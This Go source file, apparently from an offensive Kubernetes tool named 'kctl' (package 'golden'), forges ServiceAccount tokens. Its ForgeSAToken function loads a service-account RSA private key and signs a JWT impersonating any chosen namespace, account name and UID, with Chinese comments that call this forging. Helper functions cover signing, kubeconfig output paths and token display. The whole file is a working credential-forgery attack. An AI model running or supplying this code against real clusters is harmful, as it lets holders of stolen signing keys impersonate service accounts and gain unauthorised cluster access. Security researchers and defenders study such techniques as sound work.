package golden

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"path/filepath"
	"time"

	"github.com/google/uuid"
	"kctl/pkg/types"
)

// DefaultAudience 默认 audience
const DefaultAudience = "https://kubernetes.default.svc.cluster.local"

// DefaultTTL 默认 Token 有效期 (秒)
const DefaultTTL = 3600

// ForgeSAToken 伪造 ServiceAccount Token
func ForgeSAToken(opts *types.SATokenOptions) (*types.ForgeResult, error) {
	// 验证必需参数
	if opts.SAKeyPath == "" {
		return nil, fmt.Errorf("未指定 SA 私钥路径")
	}
	if opts.Namespace == "" {
		return nil, fmt.Errorf("未指定 namespace")
	}
	if opts.Name == "" {
		return nil, fmt.Errorf("未指定 name")
	}
	if opts.UID == "" {
		return nil, fmt.Errorf("未指定 UID")
	}

	// 设置默认值
	if opts.TTL <= 0 {
		opts.TTL = DefaultTTL
	}
	if opts.Audience == "" {
		opts.Audience = DefaultAudience
	}

	// 加载 SA 私钥
	saKey, err := LoadRSAPrivateKey(opts.SAKeyPath)
	if err != nil {
		return nil, fmt.Errorf("加载 SA 私钥失败: %w", err)
	}

	// 计算时间
	// 将开始时间设为 15 秒前，以容忍时钟偏差
	startTime := time.Now().Add(-15 * time.Second)
	expirationTime := startTime.Add(time.Duration(opts.TTL) * time.Second)

	// 构建 JWT Header
	header := map[string]interface{}{
		"alg": "RS256",
		"kid": "", // Kubernetes 目前忽略此字段
	}

	// 构建 JWT Payload
	jwtID := uuid.New().String()
	payload := map[string]interface{}{
		"aud": []string{opts.Audience},
		"exp": expirationTime.Unix(),
		"iat": startTime.Unix(),
		"iss": opts.Audience,
		"jti": jwtID,
		"kubernetes.io": map[string]interface{}{
			"namespace": opts.Namespace,
			"serviceaccount": map[string]interface{}{
				"name": opts.Name,
				"uid":  opts.UID,
			},
		},
		"nbf": startTime.Unix(),
		"sub": fmt.Sprintf("system:serviceaccount:%s:%s", opts.Namespace, opts.Name),
	}

	// 编码 Header 和 Payload
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return nil, fmt.Errorf("序列化 header 失败: %w", err)
	}
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("序列化 payload 失败: %w", err)
	}

	headerB64 := base64URLEncode(headerJSON)
	payloadB64 := base64URLEncode(payloadJSON)

	// 签名
	signature, err := signJWT(headerB64, payloadB64, saKey)
	if err != nil {
		return nil, fmt.Errorf("签名失败: %w", err)
	}

	// 组装 Token
	token := headerB64 + "." + payloadB64 + "." + signature

	// 构建结果
	result := &types.ForgeResult{
		Type:      types.ForgeTypeSAToken,
		Token:     token,
		Identity:  fmt.Sprintf("system:serviceaccount:%s:%s", opts.Namespace, opts.Name),
		ExpiresAt: expirationTime,
	}

	return result, nil
}

// base64URLEncode JWT 专用 Base64 URL 安全编码 (无填充)
func base64URLEncode(data []byte) string {
	return base64.RawURLEncoding.EncodeToString(data)
}

// signJWT 使用 RSA 私钥签名 JWT
func signJWT(headerB64, payloadB64 string, key *rsa.PrivateKey) (string, error) {
	message := headerB64 + "." + payloadB64
	hashed := sha256.Sum256([]byte(message))

	signature, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, hashed[:])
	if err != nil {
		return "", fmt.Errorf("RSA 签名失败: %w", err)
	}

	return base64URLEncode(signature), nil
}

// GetSATokenOutputPath 获取 SA Token kubeconfig 输出路径
func GetSATokenOutputPath(outputDir, namespace, name string) string {
	filename := fmt.Sprintf("kubeconfig_token_%s_%s", namespace, name)
	if outputDir != "" {
		return filepath.Join(outputDir, filename)
	}
	return filename
}

// FormatJWTForDisplay 格式化 JWT 用于显示
func FormatJWTForDisplay(token string) (string, error) {
	parts := splitJWT(token)
	if len(parts) != 3 {
		return "", fmt.Errorf("无效的 JWT 格式")
	}

	// 解码 header
	headerJSON, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return "", fmt.Errorf("解码 header 失败: %w", err)
	}

	// 解码 payload
	payloadJSON, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return "", fmt.Errorf("解码 payload 失败: %w", err)
	}

	// 格式化输出
	var header, payload map[string]interface{}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return "", err
	}
	if err := json.Unmarshal(payloadJSON, &payload); err != nil {
		return "", err
	}

	headerPretty, _ := json.MarshalIndent(header, "", "  ")
	payloadPretty, _ := json.MarshalIndent(payload, "", "  ")

	return fmt.Sprintf("Header:\n%s\n\nPayload:\n%s", string(headerPretty), string(payloadPretty)), nil
}

// splitJWT 分割 JWT
func splitJWT(token string) []string {
	var parts []string
	start := 0
	for i := 0; i < len(token); i++ {
		if token[i] == '.' {
			parts = append(parts, token[start:i])
			start = i + 1
		}
	}
	parts = append(parts, token[start:])
	return parts
}
